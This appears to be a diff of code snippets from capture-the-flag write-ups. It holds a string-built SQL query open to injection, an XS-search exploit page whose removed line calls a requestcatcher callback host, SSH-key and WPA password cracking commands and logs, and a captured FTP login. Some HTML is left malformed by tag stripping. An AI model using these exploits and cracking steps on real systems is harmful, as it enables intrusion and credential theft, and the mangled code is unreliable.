@@ -9,17 +9,7 @@ CREATE TABLE IF NOT EXISTS users ( username text, password text );
 INSERT INTO users ( username, password ) VALUES ( "root", "IamAvEryC0olRootUsr");
 INSERT INTO users ( username, password ) VALUES ( "skat", "fakeflg{fake_flag}");
 INSERT INTO users ( username, password ) VALUES ( "coded", "ilovegolang42");
-```
-
-
-
-```
 qstring := fmt.Sprintf("SELECT * FROM users WHERE username = \"%s\" AND password = \"%s\"", input.Username, input.Password)
-```
-
-
-
-```
 const context = await browser.createIncognitoBrowserContext();
 const page = await context.newPage();
 await page.goto("https://lamenote-web.chal.irisc.tf/");
@@ -31,11 +21,6 @@ await frame.type('input[name=image]', 'https://i.imgur.com/dQJOyoO.png');
 await frame.click('form[method=post] button[type=submit]');
 await page.waitForTimeout(1000);
 await frameWrapper.dispose();
-```
-
-
-
-```
 @app.route("/search")
 @check_request
 def search():
@@ -50,18 +35,13 @@ def search():
  break
 
  if len(results) == 0:
- return "<!DOCTYPE html><body>No notes.</body>"
+ return "<!DOCTYPE html>No notes."
 
  if len(results) == 1:
  return render_note(results[0])
- 
- return "<!DOCTYPE html><body>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + "</body>"
-```
 
+ return "<!DOCTYPE html>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + ""
 
-
-```
-<body>
 <script>
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const prefix = "irisctf{please_";
@@ -81,22 +61,17 @@ def search():
  }
  }, 0);
 </script>
-<img src="https://[yours].requestcatcher.com/start">
-<iframe name="dummyFrame" id="dummyFrame"></iframe>
+
+
 <form method="POST" target="dummyFrame" id="form" action="https://lamenote-web.chal.irisc.tf/create">
- <input name="title">
- <input name="text">
- <input name="image">
+ 
+ 
+ 
 </form>
 <form method="GET" target="dummyFrame" id="form2" action="https://lamenote-web.chal.irisc.tf/search">
- <input name="query">
+ 
 </form>
-</body>
-```
 
-
-
-```
 $ /usr/share/john/ssh2john.py home_skat/skat/.ssh/id_rsa > h
 
 $ john --wordlist=/usr/share/wordlists/rockyou.txt h
@@ -106,24 +81,14 @@ Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hash
 Cost 2 (iteration count) is 16 for all loaded hashes
 Will run 8 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-password (home_skat/skat/.ssh/id_rsa) 
+password (home_skat/skat/.ssh/id_rsa)
 1g 0:00:00:03 DONE (2024-01-06 22:09) 0.3030g/s 19.39p/s 19.39c/s 19.39C/s 123456..charlie
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
-
-
-
-```
 [wifi-security]
 auth-alg=open
 key-mgmt=wpa-psk
 psk=agdifbe7dv1iruf7ei2v5op
-```
-
-
-
-```
 [00:01:57] 894908/14344392 keys tested (7729.15 k/s)
 
  Time left: 29 minutes, 0 seconds 6.24%
@@ -139,21 +104,11 @@ psk=agdifbe7dv1iruf7ei2v5op
  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 
  EAPOL HMAC : 37 CC 99 33 10 76 AC 0C D2 11 96 09 E4 8F 22 57
-```
-
-
-
-```
 220 (vsFTPd 3.0.3)
 USER joeschmoe
 331 Please specify the password.
 PASS irisctf{welc0me_t0_th3_n3twork_c4teg
 230 Login successful.
-```
-
-
-
-```
 png_bytes = []
 for i in range(3):
  with open(f"beautiful_fish_{i}.png","rb") as fp:
@@ -170,14 +125,14 @@ with open(f"out.png","wb") as fp:
  png_bytes = [png_bytes[0], png_bytes[2]]
  while 3 <= len(png_bytes) and len(png_bytes[2]) == 0:
  png_bytes = png_bytes[:-1]
- 
+
  if len(png_bytes) == 0:
  break
 
  if len(png_bytes) == 1:
  print('My assumption is wrong... 1')
  exit(1)
- 
+
  if len(png_bytes) == 2:
  if png_bytes[0][0] == png_bytes[1][0]:
  fp.write(png_bytes[0][0].to_bytes(1, 'big'))
@@ -187,7 +142,7 @@ with open(f"out.png","wb") as fp:
  else:
  print('My assumption is wrong... 2')
  exit(2)
- 
+
  # len(png_bytes) == 3
  if (png_bytes[0][0] == png_bytes[1][0]) and (png_bytes[2][0] == png_bytes[1][0]):
  fp.write(png_bytes[0][0].to_bytes(1, 'big'))
@@ -242,21 +197,11 @@ with open(f"out.png","wb") as fp:
  fp.write(png_bytes[0][0].to_bytes(1, 'big'))
  png_bytes[0] = png_bytes[0][1:]
  continue
- 
+
  print('My assumption is wrong... 3')
  exit(3)
-```
-
-
-
-```
 $ file *
 main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9dc64e1f81cfd02193274da700f1de05742fd83, for GNU/Linux 3.2.0, not stripped
-```
-
-
-
-```
 chosenFoods.James != 2
 chosenFoods.William != 2
 chosenFoods.William != 3
@@ -267,11 +212,6 @@ chosenColors.Alice != 3
 chosenColors.Emma != 3
 chosenColors.William == 2
 chosenColors.James != 4
-```
-
-
-
-```
 chosenColors.Alice 1 red
 chosenColors.Emma 4 yellow
 chosenColors.James 3 green
@@ -281,11 +221,6 @@ chosenFoods.Alice 4 chicken
 chosenFoods.Emma 2 pasta
 chosenFoods.James 3 steak
 chosenFoods.William 1 pizza
-```
-
-
-
-```
 package main
 
 import (
